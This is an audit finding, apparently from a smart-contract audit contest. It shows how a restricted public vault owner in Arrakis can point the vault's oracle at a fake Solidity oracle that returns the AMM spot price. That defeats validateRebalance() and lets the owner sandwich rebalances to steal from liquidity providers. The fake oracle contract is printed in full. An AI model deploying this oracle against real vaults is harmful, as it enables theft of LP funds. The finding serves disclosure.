# Malicious Public Vault Owner can bypass `validateRebalance()`, to sandwich the rebalance for profit

## Summary
The contest README states:
> Public vault owner is RESTRICTED

Hence their actions are not trusted.

## Vulnerability Detail
In `ArrakisStandardManager.rebalance()`, it uses `module.validateRebalance()` before and after the rebalance, in order to ensure that the AMM's spot price has not been significantly manipulated before and after the rebalance as this would allow for sandwich attacks.

```solidity
// check if the underlying protocol price has not been
// manipulated during rebalance.
// that can indicate a sandwich attack.
module.validateRebalance(info.oracle, info.maxDeviation);
```

However, via a 2-day timelock, a malicious public vault owner can choose the oracle address that is used (by calling `updateVaultInfo()`), and can set it to a malicious oracle which simply returns the AMM spot price. 

Example malicious oracle:
```solidity
contract FakeOracle {

    HOT alm;

    constructor(address _alm) {
        alm = HOT(_alm);
    }
   // Simply returns the AMM price so that validateRebalance() is useless
    function getPrice0() external view returns (uint256 price0) {
        uint256 sqrtSpotPriceX96;
        (sqrtSpotPriceX96,,) = alm.getAMMState();


        if (sqrtSpotPriceX96 <= type(uint128).max) {
            price0 = FullMath.mulDiv(
                sqrtSpotPriceX96 * sqrtSpotPriceX96,
                10 ** 6,
                2 ** 192
            );
        } else {
            price0 = FullMath.mulDiv(
                FullMath.mulDiv(
                    sqrtSpotPriceX96, sqrtSpotPriceX96, 1 << 64
                ),
                10 ** 6,
                1 << 128
            );
        }
    }
}
```

Then when the price deviation is calculated in `validateRebalance()`, it will be `0`, so won't revert even if the actual AMM price has been manipulated.

This then allows the malicious public vault owner to sandwich the rebalance and extract value from the LPs.

## Impact
Malicious public vault owner can steal funds from LPs by changing oracle parameter in `vaultInfo`.
